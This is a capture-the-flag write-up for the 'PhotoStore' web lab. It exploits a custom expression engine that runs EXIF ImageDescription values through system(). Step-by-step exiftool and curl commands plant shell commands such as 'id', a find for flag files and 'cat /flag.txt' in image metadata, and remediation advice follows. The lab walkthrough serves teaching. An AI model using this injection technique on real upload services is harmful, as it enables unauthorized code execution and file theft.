# PhotoStore — When Your Camera's Caption Becomes Your Shell

**Lab:** [PhotoStore on WebVerse Pro](https://dashboard.webverselabs-pro.com/labs/photostore)  
**Difficulty:** Easy  
**Category:** Web / Command Injection  
**Technique:** EXIF Metadata Injection → DSL Expression Evaluation → RCE

---

## Overview

PhotoStore is a single-service web lab built on two containers — an nginx reverse proxy and a Flask photo-upload application. It simulates a real-world scenario where file metadata, something most pipelines trust implicitly, becomes the injection channel.

The lab deliberately hardens the upload path itself (extension allow-list, magic-byte verification, path-traversal guards, decompression-bomb caps) so that players must look past the obvious attack surface and into the *processing pipeline* downstream of the upload.

---

## The Attack Surface

### The Upload Studio

The site at `photostore.local` presents a polished "Upload Studio" portal. Users can drag-and-drop JPEG or PNG files (max 4 MB). There is a sample image available for download.

### The MetaDSL Engine

Buried in the site copy and visible in EXIF metadata is the mention of **MetaDSL v2.1** — a homegrown expression engine that reads the `ImageDescription` field from each photo's EXIF data and evaluates it as part of the archival pipeline.

The sample image's EXIF tells the whole story:

```
Image Description : system("echo Sample image - MetaDSL v2.1 annotations enabled")
```

This is the sink. The DSL evaluates `system("...")` expressions by passing them to a shell, and the output is reflected back in the upload response.

---

## Exploitation

### Step 1 — Download the sample

```bash
curl -s -o sample.jpg http://photostore.local/static/sample.jpg
```

### Step 2 — Inspect the EXIF

```bash
exiftool sample.jpg
```

The `ImageDescription` field confirms the MetaDSL syntax and shows that shell output is returned inline.

### Step 3 — Inject a command

Copy the sample and overwrite its `ImageDescription`:

```bash
cp sample.jpg payload.jpg
exiftool -overwrite_original \
  -ImageDescription='system("id")' payload.jpg
```

### Step 4 — Upload and observe RCE

```bash
curl -s -F "photo=@payload.jpg" http://photostore.local/upload
```

Response:

```json
{
  "metadata_processed": "uid=1000(photo) gid=1000(photo) groups=1000(photo)"
}
```

The `metadata_processed` field reflects the stdout of the injected command. This is **unauthenticated remote code execution** as the `photo` user.

### Step 5 — Find and read the flag

```bash
exiftool -overwrite_original \
  -ImageDescription='system("find / -name flag* -type f 2>/dev/null")' payload.jpg
curl -s -F "photo=@payload.jpg" http://photostore.local/upload
```

Flag located at `/flag.txt`. Read it:

```bash
exiftool -overwrite_original \
  -ImageDescription='system("cat /flag.txt")' payload.jpg
curl -s -F "photo=@payload.jpg" http://photostore.local/upload
```

---

## Key Takeaways

### What makes this interesting

- **The injection surface is non-obvious.** The upload validation is solid — the vulnerability lives in what happens *after* the file is accepted.
- **Metadata as an attack channel.** EXIF data is user-controlled and often passes through pipelines unexamined. This lab demonstrates why treating metadata as untrusted input matters.
- **Homegrown expression engines.** The `system()` call inside a custom DSL is a textbook command injection sink. Any expression engine that wraps shell execution without sanitization is a game-over vulnerability.

### Skills exercised

- Image file format analysis and EXIF metadata manipulation
- Identifying injection surfaces in data-processing pipelines
- Crafting payloads through constrained (file metadata) input channels
- Recon of multi-stage upload pipelines to locate the real vulnerability sink

---

## Remediation Guidance

1. **Never evaluate user-supplied data through a shell.** A DSL that wraps `system()` is inherently unsafe.
2. **Strip or sanitize EXIF metadata** at the ingestion boundary before any processing occurs.
3. **Use parameterised APIs** instead of string interpolation into shell commands.
4. **Principle of least privilege** — the `photo` user should not have access to `/flag.txt`.

---

*Lab hosted on [WebVerse Pro](https://dashboard.webverselabs-pro.com/labs/photostore)*
